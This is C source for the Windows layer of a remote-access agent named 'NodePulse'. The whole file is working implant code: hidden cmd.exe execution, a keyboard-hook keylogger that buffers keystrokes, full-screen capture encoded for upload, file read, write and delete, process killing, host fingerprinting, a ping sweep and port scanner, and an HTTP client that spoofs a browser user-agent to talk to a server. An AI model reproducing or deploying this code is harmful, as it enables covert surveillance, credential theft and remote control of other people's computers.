/*
 * NodePulse Agent - Windows Platform Implementation
 */

#ifdef _WIN32

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include "platform.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

/* ============================================================================
 * Global State
 * ============================================================================ */

static HINTERNET g_session = NULL;
static int g_keylogger_active = 0;
static HHOOK g_keyboard_hook = NULL;
static char* g_keylog_buffer = NULL;
static size_t g_keylog_size = 0;
static size_t g_keylog_capacity = 0;
static CRITICAL_SECTION g_keylog_lock;

/* ============================================================================
 * Base64 Encoding (Used for screenshots)
 * ============================================================================ */

static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* base64_encode(const unsigned char* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3);
    char* encoded = (char*)malloc(out_len + 1);
    if (!encoded) return NULL;
    
    size_t i, j;
    for (i = 0, j = 0; i < len;) {
        unsigned int a = i < len ? data[i++] : 0;
        unsigned int b = i < len ? data[i++] : 0;
        unsigned int c = i < len ? data[i++] : 0;
        unsigned int triple = (a << 16) | (b << 8) | c;
        
        encoded[j++] = b64_table[(triple >> 18) & 0x3F];
        encoded[j++] = b64_table[(triple >> 12) & 0x3F];
        encoded[j++] = (i > len + 1) ? '=' : b64_table[(triple >> 6) & 0x3F];
        encoded[j++] = (i > len) ? '=' : b64_table[triple & 0x3F];
    }
    encoded[out_len] = '\0';
    return encoded;
}

unsigned char* base64_decode(const char* encoded, size_t* out_len) {
    /* Simplified decoder - implement as needed */
    *out_len = 0;
    return NULL;
}

/* ============================================================================
 * Initialization
 * ============================================================================ */

int platform_init(void) {
    /* Initialize WinHTTP session */
    g_session = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME,
                            WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_session) return -1;
    
    /* Initialize Winsock */
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return -1;
    
    /* Initialize keylogger lock */
    InitializeCriticalSection(&g_keylog_lock);
    
    /* Seed random */
    srand((unsigned int)time(NULL) ^ GetCurrentProcessId());
    
    return 0;
}

void platform_cleanup(void) {
    if (g_session) {
        WinHttpCloseHandle(g_session);
        g_session = NULL;
    }
    WSACleanup();
    
    keylogger_stop();
    DeleteCriticalSection(&g_keylog_lock);
    
    if (g_keylog_buffer) {
        free(g_keylog_buffer);
        g_keylog_buffer = NULL;
    }
}

/* ============================================================================
 * HTTP Transport
 * ============================================================================ */

int http_post(const char* url, const char* data, size_t data_len,
              const char* content_type, HttpResponse* response) {
    if (!g_session || !response) return -1;
    
    response->data = NULL;
    response->size = 0;
    response->status_code = 0;
    
    /* Parse URL */
    wchar_t wurl[2048];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 2048);
    
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    wchar_t hostName[256], urlPath[2048];
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = 2048;
    
    if (!WinHttpCrackUrl(wurl, 0, 0, &urlComp)) return -1;
    
    /* Connect */
    HINTERNET hConnect = WinHttpConnect(g_session, hostName, urlComp.nPort, 0);
    if (!hConnect) return -1;
    
    /* Create request */
    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath, NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        return -1;
    }
    
    /* Add headers */
    wchar_t wcontent_type[256];
    MultiByteToWideChar(CP_UTF8, 0, content_type, -1, wcontent_type, 256);
    wchar_t header[512];
    swprintf(header, 512, L"Content-Type: %s", wcontent_type);
    WinHttpAddRequestHeaders(hRequest, header, -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    /* Send request */
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)data, (DWORD)data_len, (DWORD)data_len, 0)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return -1;
    }
    
    /* Receive response */
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return -1;
    }
    
    /* Get status code */
    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
    response->status_code = (int)statusCode;
    
    /* Read response body */
    size_t capacity = 4096;
    response->data = (char*)malloc(capacity);
    response->size = 0;
    
    DWORD bytesRead;
    char buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        if (response->size + bytesRead >= capacity) {
            capacity *= 2;
            response->data = (char*)realloc(response->data, capacity);
        }
        memcpy(response->data + response->size, buffer, bytesRead);
        response->size += bytesRead;
    }
    response->data[response->size] = '\0';
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return 0;
}

/* HTTP POST with custom headers - with verbose WinHTTP logging for debugging */
int http_post_with_headers(const char* url, const char* data, size_t data_len,
                           const char* content_type, const char** headers,
                           int header_count, HttpResponse* response) {
    if (!g_session || !response) {
        OutputDebugStringA("[WinHTTP] ERROR: No session or null response\n");
        return -1;
    }
    
    response->data = NULL;
    response->size = 0;
    response->status_code = 0;
    
    /* Parse URL */
    wchar_t wurl[2048];
    MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, 2048);
    
    /* DEBUG: Log URL */
    char dbg[512];
    snprintf(dbg, sizeof(dbg), "[WinHTTP] POST to: %s\n", url);
    OutputDebugStringA(dbg);
    
    URL_COMPONENTS urlComp = {0};
    urlComp.dwStructSize = sizeof(urlComp);
    wchar_t hostName[256], urlPath[2048];
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = 256;
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = 2048;
    
    if (!WinHttpCrackUrl(wurl, 0, 0, &urlComp)) {
        DWORD err = GetLastError();
        snprintf(dbg, sizeof(dbg), "[WinHTTP] ERROR: WinHttpCrackUrl failed, err=%lu\n", err);
        OutputDebugStringA(dbg);
        return -1;
    }
    
    /* Connect */
    HINTERNET hConnect = WinHttpConnect(g_session, hostName, urlComp.nPort, 0);
    if (!hConnect) {
        DWORD err = GetLastError();
        snprintf(dbg, sizeof(dbg), "[WinHTTP] ERROR: WinHttpConnect failed, err=%lu\n", err);
        OutputDebugStringA(dbg);
        return -1;
    }
    
    /* Create request */
    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", urlPath, NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        DWORD err = GetLastError();
        snprintf(dbg, sizeof(dbg), "[WinHTTP] ERROR: WinHttpOpenRequest failed, err=%lu\n", err);
        OutputDebugStringA(dbg);
        WinHttpCloseHandle(hConnect);
        return -1;
    }
    
    /* Build ALL headers as a single string for WinHttpSendRequest */
    wchar_t all_headers[4096] = {0};
    size_t offset = 0;
    
    /* Add Content-Type header */
    wchar_t wcontent_type[256];
    MultiByteToWideChar(CP_UTF8, 0, content_type, -1, wcontent_type, 256);
    offset += swprintf(all_headers + offset, 4096 - offset, L"Content-Type: %s\r\n", wcontent_type);
    
    /* Add custom headers (key-value pairs) */
    for (int i = 0; i + 1 < header_count; i += 2) {
        wchar_t wkey[256], wvalue[1024];
        MultiByteToWideChar(CP_UTF8, 0, headers[i], -1, wkey, 256);
        MultiByteToWideChar(CP_UTF8, 0, headers[i + 1], -1, wvalue, 1024);
        offset += swprintf(all_headers + offset, 4096 - offset, L"%s: %s\r\n", wkey, wvalue);
    }
    
    /* DEBUG: Log header string length */
    snprintf(dbg, sizeof(dbg), "[WinHTTP] Header string length: %zu wide chars\n", wcslen(all_headers));
    OutputDebugStringA(dbg);
    
    /* DEBUG: Convert wide string to narrow for logging (first 100 chars, redact sensitive) */
    char narrow_headers[256] = {0};
    WideCharToMultiByte(CP_UTF8, 0, all_headers, 100, narrow_headers, 255, NULL, NULL);
    snprintf(dbg, sizeof(dbg), "[WinHTTP] Headers (first 100): %.100s...\n", narrow_headers);
    OutputDebugStringA(dbg);
    
    /* Send request with ALL headers passed directly to WinHttpSendRequest */
    DWORD header_len = (DWORD)wcslen(all_headers);
    BOOL sendResult = WinHttpSendRequest(hRequest, 
                            all_headers,
                            header_len,
                            (LPVOID)data, 
                            (DWORD)data_len, 
                            (DWORD)data_len, 
                            0);
    
    if (!sendResult) {
        DWORD err = GetLastError();
        snprintf(dbg, sizeof(dbg), "[WinHTTP] ERROR: WinHttpSendRequest failed, err=%lu\n", err);
        OutputDebugStringA(dbg);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return -1;
    }
    
    snprintf(dbg, sizeof(dbg), "[WinHTTP] WinHttpSendRequest succeeded\n");
    OutputDebugStringA(dbg);
    
    /* Receive response */
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD err = GetLastError();
        snprintf(dbg, sizeof(dbg), "[WinHTTP] ERROR: WinHttpReceiveResponse failed, err=%lu\n", err);
        OutputDebugStringA(dbg);
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        return -1;
    }
    
    /* Get status code */
    DWORD statusCode = 0, statusSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
    response->status_code = (int)statusCode;
    
    snprintf(dbg, sizeof(dbg), "[WinHTTP] Response status code: %d\n", response->status_code);
    OutputDebugStringA(dbg);
    
    /* Read response body */
    size_t capacity = 4096;
    response->data = (char*)malloc(capacity);
    response->size = 0;
    
    DWORD bytesRead;
    char buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        if (response->size + bytesRead >= capacity) {
            capacity *= 2;
            response->data = (char*)realloc(response->data, capacity);
        }
        memcpy(response->data + response->size, buffer, bytesRead);
        response->size += bytesRead;
    }
    response->data[response->size] = '\0';
    
    snprintf(dbg, sizeof(dbg), "[WinHTTP] Response body size: %zu bytes\n", response->size);
    OutputDebugStringA(dbg);
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    return 0;
}

int http_get(const char* url, HttpResponse* response) {
    return http_post(url, NULL, 0, "text/plain", response);
}

void http_response_free(HttpResponse* response) {
    if (response && response->data) {
        free(response->data);
        response->data = NULL;
        response->size = 0;
    }
}

/* ============================================================================
 * Process Execution
 * ============================================================================ */

int run_command(const char* cmd, char** output, size_t* output_len) {
    if (!output) return -1;
    
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hReadPipe, hWritePipe;
    
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return -1;
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
    
    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    
    char cmdline[4096];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return -1;
    }
    
    CloseHandle(hWritePipe);
    
    /* Read output */
    size_t capacity = 4096;
    *output = (char*)malloc(capacity);
    size_t total = 0;
    
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        if (total + bytesRead >= capacity) {
            capacity *= 2;
            *output = (char*)realloc(*output, capacity);
        }
        memcpy(*output + total, buffer, bytesRead);
        total += bytesRead;
    }
    (*output)[total] = '\0';
    if (output_len) *output_len = total;
    
    CloseHandle(hReadPipe);
    
    /* Wait for process and get exit code */
    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return (int)exitCode;
}

int get_process_list(char** output) {
    return run_command("tasklist /fo csv", output, NULL);
}

int kill_process(int pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)pid);
    if (!hProcess) return -1;
    int result = TerminateProcess(hProcess, 1) ? 0 : -1;
    CloseHandle(hProcess);
    return result;
}

/* ============================================================================
 * System Information
 * ============================================================================ */

int get_hostname(char* buf, size_t len) {
    DWORD size = (DWORD)len;
    return GetComputerNameA(buf, &size) ? 0 : -1;
}

int get_username(char* buf, size_t len) {
    DWORD size = (DWORD)len;
    return GetUserNameA(buf, &size) ? 0 : -1;
}

int get_os_info(char* buf, size_t len) {
    snprintf(buf, len, "Windows");
    
    /* Try to get version from registry */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char productName[256] = {0};
        DWORD size = sizeof(productName);
        if (RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)productName, &size) == ERROR_SUCCESS) {
            snprintf(buf, len, "%s", productName);
        }
        RegCloseKey(hKey);
    }
    return 0;
}

int get_arch_info(char* buf, size_t len) {
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    
    switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            strncpy(buf, "x86_64", len);
            break;
        case PROCESSOR_ARCHITECTURE_ARM64:
            strncpy(buf, "arm64", len);
            break;
        case PROCESSOR_ARCHITECTURE_INTEL:
            strncpy(buf, "x86", len);
            break;
        default:
            strncpy(buf, "unknown", len);
    }
    return 0;
}

int get_internal_ip(char* buf, size_t len) {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) return -1;
    
    struct addrinfo hints = {0}, *result;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0) return -1;
    
    struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr;
    inet_ntop(AF_INET, &addr->sin_addr, buf, (socklen_t)len);
    
    freeaddrinfo(result);
    return 0;
}

int get_external_ip(char* buf, size_t len, const char* service_url) {
    HttpResponse response = {0};
    if (http_get(service_url, &response) != 0) return -1;
    
    if (response.data && response.size > 0) {
        strncpy(buf, response.data, len - 1);
        buf[len - 1] = '\0';
        /* Trim whitespace */
        char* end = buf + strlen(buf) - 1;
        while (end > buf && (*end == '\n' || *end == '\r' || *end == ' ')) {
            *end-- = '\0';
        }
    }
    
    http_response_free(&response);
    return 0;
}

int get_mac_address(char* buf, size_t len) {
    IP_ADAPTER_INFO adapters[16];
    ULONG size = sizeof(adapters);
    
    if (GetAdaptersInfo(adapters, &size) != ERROR_SUCCESS) return -1;
    
    snprintf(buf, len, "%02X:%02X:%02X:%02X:%02X:%02X",
             adapters[0].Address[0], adapters[0].Address[1],
             adapters[0].Address[2], adapters[0].Address[3],
             adapters[0].Address[4], adapters[0].Address[5]);
    return 0;
}

long get_system_uptime(void) {
    return (long)(GetTickCount64() / 1000);
}

int get_memory_info(char** output) {
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);
    
    *output = (char*)malloc(512);
    snprintf(*output, 512,
             "{\"total\":%llu,\"available\":%llu,\"used\":%llu,\"percent\":%lu}",
             mem.ullTotalPhys, mem.ullAvailPhys,
             mem.ullTotalPhys - mem.ullAvailPhys,
             mem.dwMemoryLoad);
    return 0;
}

int get_disk_info(char** output) {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, freeBytes;
    GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &freeBytes);
    
    *output = (char*)malloc(512);
    snprintf(*output, 512,
             "{\"total\":%llu,\"free\":%llu,\"used\":%llu}",
             totalBytes.QuadPart, freeBytes.QuadPart,
             totalBytes.QuadPart - freeBytes.QuadPart);
    return 0;
}

/* ============================================================================
 * File Operations
 * ============================================================================ */

int file_read(const char* path, char** content, size_t* len) {
    FILE* f = fopen(path, "rb");
    if (!f) return -1;
    
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    *content = (char*)malloc(size + 1);
    fread(*content, 1, size, f);
    (*content)[size] = '\0';
    if (len) *len = size;
    
    fclose(f);
    return 0;
}

int file_write(const char* path, const char* content, size_t len) {
    FILE* f = fopen(path, "wb");
    if (!f) return -1;
    fwrite(content, 1, len, f);
    fclose(f);
    return 0;
}

int file_append(const char* path, const char* content, size_t len) {
    FILE* f = fopen(path, "ab");
    if (!f) return -1;
    fwrite(content, 1, len, f);
    fclose(f);
    return 0;
}

int file_delete(const char* path) {
    return DeleteFileA(path) ? 0 : -1;
}

int file_exists(const char* path) {
    DWORD attrs = GetFileAttributesA(path);
    return (attrs != INVALID_FILE_ATTRIBUTES) ? 1 : 0;
}

long file_size(const char* path) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExA(path, GetFileExInfoStandard, &fad)) return -1;
    return (long)fad.nFileSizeLow;
}

int file_list(const char* path, char** output) {
    WIN32_FIND_DATAA ffd;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);
    
    HANDLE hFind = FindFirstFileA(searchPath, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;
    
    size_t capacity = 4096;
    *output = (char*)malloc(capacity);
    size_t pos = 1;
    (*output)[0] = '[';
    
    int first = 1;
    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) continue;
        
        char entry[1024];
        int isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
        snprintf(entry, sizeof(entry), "%s{\"name\":\"%s\",\"is_dir\":%s,\"size\":%lu}",
                 first ? "" : ",", ffd.cFileName, isDir ? "true" : "false",
                 ffd.nFileSizeLow);
        first = 0;
        
        size_t entry_len = strlen(entry);
        if (pos + entry_len + 2 >= capacity) {
            capacity *= 2;
            *output = (char*)realloc(*output, capacity);
        }
        strcpy(*output + pos, entry);
        pos += entry_len;
    } while (FindNextFileA(hFind, &ffd));
    
    FindClose(hFind);
    
    (*output)[pos++] = ']';
    (*output)[pos] = '\0';
    return 0;
}

/* Recursive directory listing for tree command */
static int file_list_recursive_internal(const char* path, int depth, char** output, size_t* capacity, size_t* pos, int* first) {
    if (depth <= 0) return 0;
    
    WIN32_FIND_DATAA ffd;
    char searchPath[MAX_PATH];
    snprintf(searchPath, MAX_PATH, "%s\\*", path);
    
    HANDLE hFind = FindFirstFileA(searchPath, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return -1;
    
    do {
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0) continue;
        
        int isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
        char fullPath[MAX_PATH];
        snprintf(fullPath, MAX_PATH, "%s\\%s", path, ffd.cFileName);
        
        /* Build JSON entry */
        char entry[2048];
        if (isDir && depth > 1) {
            /* For directories with remaining depth, recurse and include children */
            size_t child_capacity = 4096;
            char* children = (char*)malloc(child_capacity);
            size_t child_pos = 1;
            children[0] = '[';
            int child_first = 1;
            
            file_list_recursive_internal(fullPath, depth - 1, &children, &child_capacity, &child_pos, &child_first);
            
            children[child_pos++] = ']';
            children[child_pos] = '\0';
            
            snprintf(entry, sizeof(entry), "%s{\"name\":\"%s\",\"path\":\"%s\",\"type\":\"directory\",\"children\":%s}",
                     *first ? "" : ",", ffd.cFileName, fullPath, children);
            free(children);
        } else if (isDir) {
            snprintf(entry, sizeof(entry), "%s{\"name\":\"%s\",\"path\":\"%s\",\"type\":\"directory\"}",
                     *first ? "" : ",", ffd.cFileName, fullPath);
        } else {
            snprintf(entry, sizeof(entry), "%s{\"name\":\"%s\",\"path\":\"%s\",\"type\":\"file\",\"size\":%lu}",
                     *first ? "" : ",", ffd.cFileName, fullPath, ffd.nFileSizeLow);
        }
        *first = 0;
        
        size_t entry_len = strlen(entry);
        while (*pos + entry_len + 2 >= *capacity) {
            *capacity *= 2;
            *output = (char*)realloc(*output, *capacity);
        }
        strcpy(*output + *pos, entry);
        *pos += entry_len;
    } while (FindNextFileA(hFind, &ffd));
    
    FindClose(hFind);
    return 0;
}

int file_list_recursive(const char* path, int depth, char** output) {
    size_t capacity = 16384; /* Start with larger buffer for tree */
    *output = (char*)malloc(capacity);
    size_t pos = 1;
    (*output)[0] = '[';
    int first = 1;
    
    file_list_recursive_internal(path, depth, output, &capacity, &pos, &first);
    
    (*output)[pos++] = ']';
    (*output)[pos] = '\0';
    return 0;
}

int dir_create(const char* path) {
    return CreateDirectoryA(path, NULL) ? 0 : -1;
}

/* ============================================================================
 * Screenshot
 * ============================================================================ */

int capture_screenshot(char** base64_data) {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    /* Get bitmap data */
    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = width;
    bi.biHeight = -height; /* Top-down */
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    
    int rowSize = ((width * 3 + 3) & ~3);
    size_t dataSize = rowSize * height;
    unsigned char* pixelData = (unsigned char*)malloc(dataSize);
    
    GetDIBits(hdcMem, hBitmap, 0, height, pixelData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    
    /* Create BMP file in memory */
    BITMAPFILEHEADER bfh = {0};
    bfh.bfType = 0x4D42; /* "BM" */
    bfh.bfSize = sizeof(bfh) + sizeof(bi) + dataSize;
    bfh.bfOffBits = sizeof(bfh) + sizeof(bi);
    
    size_t bmpSize = sizeof(bfh) + sizeof(bi) + dataSize;
    unsigned char* bmpData = (unsigned char*)malloc(bmpSize);
    memcpy(bmpData, &bfh, sizeof(bfh));
    memcpy(bmpData + sizeof(bfh), &bi, sizeof(bi));
    memcpy(bmpData + sizeof(bfh) + sizeof(bi), pixelData, dataSize);
    
    /* Base64 encode */
    *base64_data = base64_encode(bmpData, bmpSize);
    
    free(bmpData);
    free(pixelData);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    
    return *base64_data ? 0 : -1;
}

/* ============================================================================
 * Network Scanning
 * ============================================================================ */

int network_scan_hosts(const char* subnet, char** output) {
    /* Basic ping sweep - simplified for brevity */
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "for /L %%i in (1,1,254) do @ping -n 1 -w 100 %s.%%i | find \"Reply\" && echo %s.%%i", subnet, subnet);
    return run_command(cmd, output, NULL);
}

int network_scan_ports(const char* host, int* ports, int port_count, char** output) {
    size_t capacity = 1024;
    *output = (char*)malloc(capacity);
    size_t pos = 1;
    (*output)[0] = '[';
    
    int first = 1;
    for (int i = 0; i < port_count; i++) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) continue;
        
        /* Set non-blocking */
        u_long mode = 1;
        ioctlsocket(sock, FIONBIO, &mode);
        
        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(ports[i]);
        inet_pton(AF_INET, host, &addr.sin_addr);
        
        connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(sock, &writefds);
        
        struct timeval tv = {0, 500000}; /* 500ms timeout */
        int result = select(0, NULL, &writefds, NULL, &tv);
        
        if (result > 0) {
            char entry[64];
            snprintf(entry, sizeof(entry), "%s%d", first ? "" : ",", ports[i]);
            first = 0;
            
            size_t entry_len = strlen(entry);
            if (pos + entry_len + 2 >= capacity) {
                capacity *= 2;
                *output = (char*)realloc(*output, capacity);
            }
            strcpy(*output + pos, entry);
            pos += entry_len;
        }
        
        closesocket(sock);
    }
    
    (*output)[pos++] = ']';
    (*output)[pos] = '\0';
    return 0;
}

int get_network_interfaces(char** output) {
    return run_command("ipconfig /all", output, NULL);
}

/* ============================================================================
 * Keylogger
 * ============================================================================ */

static LRESULT CALLBACK keyboard_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
        
        EnterCriticalSection(&g_keylog_lock);
        
        if (g_keylog_size + 16 >= g_keylog_capacity) {
            g_keylog_capacity = g_keylog_capacity ? g_keylog_capacity * 2 : 4096;
            g_keylog_buffer = (char*)realloc(g_keylog_buffer, g_keylog_capacity);
        }
        
        /* Convert virtual key to character */
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        
        WCHAR unicodeChar[4];
        int result = ToUnicode(kbs->vkCode, kbs->scanCode, keyboardState, unicodeChar, 4, 0);
        
        if (result > 0) {
            char utf8[8];
            WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, utf8, sizeof(utf8), NULL, NULL);
            strcpy(g_keylog_buffer + g_keylog_size, utf8);
            g_keylog_size += strlen(utf8);
        } else {
            /* Special keys */
            char* special = NULL;
            switch (kbs->vkCode) {
                case VK_RETURN: special = "[ENTER]"; break;
                case VK_BACK: special = "[BACKSPACE]"; break;
                case VK_TAB: special = "[TAB]"; break;
                case VK_SPACE: special = " "; break;
            }
            if (special) {
                strcpy(g_keylog_buffer + g_keylog_size, special);
                g_keylog_size += strlen(special);
            }
        }
        
        LeaveCriticalSection(&g_keylog_lock);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int keylogger_start(void) {
    if (g_keylogger_active) return 0;
    
    g_keyboard_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_hook_proc, NULL, 0);
    if (!g_keyboard_hook) return -1;
    
    g_keylogger_active = 1;
    return 0;
}

int keylogger_stop(void) {
    if (!g_keylogger_active) return 0;
    
    if (g_keyboard_hook) {
        UnhookWindowsHookEx(g_keyboard_hook);
        g_keyboard_hook = NULL;
    }
    g_keylogger_active = 0;
    return 0;
}

int keylogger_get_buffer(char** output) {
    EnterCriticalSection(&g_keylog_lock);
    
    if (g_keylog_buffer && g_keylog_size > 0) {
        *output = (char*)malloc(g_keylog_size + 1);
        memcpy(*output, g_keylog_buffer, g_keylog_size);
        (*output)[g_keylog_size] = '\0';
        g_keylog_size = 0;
    } else {
        *output = _strdup("");
    }
    
    LeaveCriticalSection(&g_keylog_lock);
    return 0;
}

/* ============================================================================
 * Utility Functions
 * ============================================================================ */

void platform_sleep(int milliseconds) {
    Sleep(milliseconds);
}

long platform_time(void) {
    return (long)time(NULL);
}

int platform_random(unsigned char* buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        buf[i] = (unsigned char)(rand() & 0xFF);
    }
    return 0;
}

char* url_encode(const char* str) {
    size_t len = strlen(str);
    char* encoded = (char*)malloc(len * 3 + 1);
    char* p = encoded;
    
    for (size_t i = 0; i < len; i++) {
        char c = str[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '-' || c == '_' || c == '.' || c == '~') {
            *p++ = c;
        } else {
            sprintf(p, "%%%02X", (unsigned char)c);
            p += 3;
        }
    }
    *p = '\0';
    return encoded;
}

#endif /* _WIN32 */
